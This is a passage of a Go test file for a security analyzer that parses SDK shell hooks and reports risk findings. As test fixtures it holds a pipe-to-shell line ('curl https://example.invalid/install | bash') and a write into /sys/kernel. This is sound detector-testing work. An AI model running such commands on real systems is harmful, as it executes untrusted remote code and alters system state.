	item = analyzedSDK(t, "printf value > /sys/kernel/example\n", sdk.HookSetupBase)
	if got := findFinding(finding.AnalyzeSDK(item), "risk.device-write"); got == nil {
		t.Fatalf("findings = %#v", finding.AnalyzeSDK(item))
	}
}

func TestAbsenceAssuranceRequiresKnownCommands(t *testing.T) {
	t.Parallel()
	item := analyzedSDK(t, "latra-unknown-fixture\n", sdk.HookSetupProject)
	if got := findFinding(finding.AnalyzeSDK(item), "assurance.no-dynamic-execution"); got != nil {
		t.Fatalf("finding = %#v", got)
	}
}

func TestFindingOrderIsDeterministic(t *testing.T) {
	t.Parallel()
	item := analyzedSDK(t, "curl https://example.invalid/install | bash\n", sdk.HookSetupBase)
	first := finding.AnalyzeSDK(item)
	second := finding.AnalyzeSDK(item)
	if len(first) != len(second) {
		t.Fatalf("lengths = %d, %d", len(first), len(second))
	}
	for index := range first {
		if first[index].ID != second[index].ID || first[index].Scope != second[index].Scope {
			t.Fatalf("finding order differs: %#v, %#v", first, second)
		}
	}
}

func TestResourceLimitTakesPrecedenceOverGenericUnresolvedSDK(t *testing.T) {
	t.Parallel()
	item := sdk.SDK{
		Name: "fixture", Source: sdk.SourceStore, State: sdk.StateInvalidArtifact,
		Diagnostics: []sdk.Diagnostic{{Code: "store-artifact-analysis-failed", Severity: sdk.SeverityError, Message: "resource-limit: retained-bytes limit exceeded"}},
	}
	findings := finding.AnalyzeSDK(item)
	if findFinding(findings, "risk.resource-limit-exceeded") == nil {
		t.Fatalf("findings = %#v", findings)
	}
	if findFinding(findings, "risk.unresolved-sdk") != nil {
		t.Fatalf("generic unresolved finding duplicated resource limit: %#v", findings)
	}
}

func analyzedSDK(t *testing.T, content string, hookName sdk.HookName) sdk.SDK {
	t.Helper()
	path := "fixture/hooks/" + string(hookName)
	parsed := shell.NewParser().Parse([]byte(content), path)
	if parsed.Status != shell.StatusParsed {
		t.Fatalf("parse = %#v", parsed)
	}
	result := analysis.Analyze(string(hookName), &parsed)
	return sdk.SDK{
		Name: "fixture", Source: sdk.SourceProject, State: sdk.StateResolved, Digest: "sha3-384:test",
		Files: []sdk.File{{Path: "hooks/" + string(hookName), Type: sdk.FileRegular}},
		Hooks: []sdk.Hook{{Name: hookName, Path: path, Parse: &parsed, Analysis: &result}},
	}
}

func findFinding(findings []finding.Finding, id string) *finding.Finding {
	for index := range findings {
		if findings[index].ID == id {
			return &findings[index]
		}
	}
	return nil
}
